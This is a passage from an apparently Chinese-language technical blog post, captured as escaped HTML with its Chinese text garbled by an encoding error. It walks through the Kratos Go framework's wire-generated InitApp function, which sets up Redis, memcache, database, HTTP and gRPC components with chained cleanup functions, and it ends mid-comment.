        &lt;span class=&#34;c1&#34;&gt;// ä¸€æ—¦æœ‰ä¿¡å·è¿›æ¥äº†ï¼Œçœ‹ä¸‹é¢çš„ä»£ç é€»è¾‘ï¼Œå…«æˆæ˜¯å…³é—­è¿™ä¸ªåº”ç”¨ã€‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;		&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;get a signal %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SIGQUIT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SIGTERM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SIGINT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
			&lt;span class=&#34;nf&#34;&gt;closeFunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
			&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;kratos-demo exit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
			&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Second&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SIGHUP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;initializer&#34;&gt;Initializer&lt;/h2&gt;
&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬å»çœ‹&lt;code&gt;di.InitApp()&lt;/code&gt;é‡Œåšäº†ä»€ä¹ˆã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ–¹æ³•æ˜¯é€šè¿‡&lt;code&gt;github.com/google/wire&lt;/code&gt;æ¥ç”Ÿæˆ.&lt;/p&gt;
&lt;p&gt;å¦‚æœä½ ä¸çŸ¥é“&lt;code&gt;wire&lt;/code&gt;å¯ä»¥å‚è€ƒä¸‹é¢çš„å®˜æ–¹åŸè¯ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Wire is a code generation tool that automates connecting components using dependency injection. Dependencies between components are represented in Wire as function parameters, encouraging explicit initialization instead of global variables. Because Wire operates without runtime state or reflection, code written to be used with Wire is useful even for hand-written initialization.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ç®€å•æ¥è¯´å°±æ˜¯Golangçš„ä¾èµ–æ³¨å…¥ä»£ç ç”Ÿæˆå™¨, å®ƒä¸ä½¿ç”¨åå°„.ç”±Googleæä¾›.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä¸è¿‡&lt;code&gt;Wire&lt;/code&gt;ä¸æ˜¯æˆ‘ä»¬çš„é‡ç‚¹, æˆ‘ä»¬æ¥ç€å›åˆ°&lt;code&gt;di.InitApp()&lt;/code&gt;å»ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Injectors from wire.go:
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;InitApp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;App&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// åŸºæœ¬ä¸Šå°±æ˜¯åˆ›å»ºä¸€ä¸ªä¸ªå®ä¾‹ï¼Œå’Œå–„åå®ƒä»¬çš„å‡½æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// å¦‚æœé€”ä¸­åˆ›å»ºå‡ºé—®é¢˜å°±å…¨ä½“ä¸‹è‘¬ï¼ˆè§¦å‘å–„åå‡½æ•°ï¼‰.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;// Rediså®ä¾‹ï¼Œå–„åå‡½æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;redis&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;NewRedis&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;// memcacheå®ä¾‹ï¼Œå–„åå‡½æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;memcache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cleanup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;NewMC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;// çœ‹èµ·æ¥åªæ”¯æŒMySQLï¼Œå–„åå‡½æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cleanup3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;NewDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;// æŠŠä¸Šé¢æ‰€æœ‰çš„æ¨¡å‹å¯¹è±¡åšä¸€ä¸ªDAOå±‚å°è£…
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;daoDao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cleanup4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;redis&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;memcache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// è¿™ä¸ªæ˜¯ä¸ªé‡ç‚¹ï¼Œ`service`æ˜¯ä½ çš„gRPCæœåŠ¡.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;// ä¸€ä¼šæˆ‘ä»¬å»åˆ†æä»–
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;serviceService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cleanup5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;daoDao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// æœ‰äººä¼šå¥½å¥‡Kratosæ˜¯æ€ä¹ˆæŠŠgRPCå’ŒGinèåˆåœ¨ä¸€èµ·çš„
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//ï¼ˆæ²¡é”™Bilibiliçš„webæ¡†æ¶æ˜¯Gin, ä¸è¿‡è¿™ä¸ªGinçš„ä¸€éƒ¨åˆ†æ ¸å¿ƒä»£ç å·²ç»è¢«é­”æ”¹è¿‡äº†ï¼Œ åœ¨Engineåˆå§‹åŒ–çš„æ—¶å€™ä¼šå¤šåŠ å…¥ä¸€ä¸ªé“¾è·¯è¿½è¸ªçš„Middleware, è¿˜æœ‰ä¸€å †è·¯ç”±...ï¼‰
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// ç§˜å¯†å°±åœ¨è¿™é‡Œï¼Œç­‰ä¼šæˆ‘ä»¬å†çœ‹
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;engine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serviceService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    
    &lt;span class=&#34;c1&#34;&gt;// gRPCçš„åˆå§‹åŒ–çš„å¸¸è§„æ“ä½œ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;grpc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serviceService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    
    &lt;span class=&#34;c1&#34;&gt;// æŠŠä¸Šé¢çš„æœåŠ¡ï¼Œengine,gRPCæœåŠ¡,æ•´ä¸€å—
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;// å–„åå‡½æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;// åé¢ç¨å¾®åˆ†æä¸€ä¸‹
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cleanup6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;NewApp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serviceService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;engine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    
    &lt;span class=&#34;c1&#34;&gt;// ä½ å¯ä»¥èµ°äº†.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;//ä»¥ä¸Šä»£ç å…¨æ˜¯è‡ªåŠ¨ç”Ÿæˆï¼Œå†—ä½™å¾ˆæ­£å¸¸
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬é¦–å…ˆçœ‹çœ‹&lt;code&gt;serviceService&lt;/code&gt;æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿.&lt;em&gt;(è¿™æ˜¯ä»€ä¹ˆé­”é¬¼å‘½å)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;è¿›åˆ°&lt;code&gt;Service.New(dao)&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;
&lt;span class=&#34;c1&#34;&gt;// Service service.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// é…ç½®æ–‡ä»¶æ˜ å°„çš„Map (è¿™ä¸ªå‘½åå°±nmç¦»è°±)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;ac&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;paladin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Map&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// å­—é¢æ„æ€
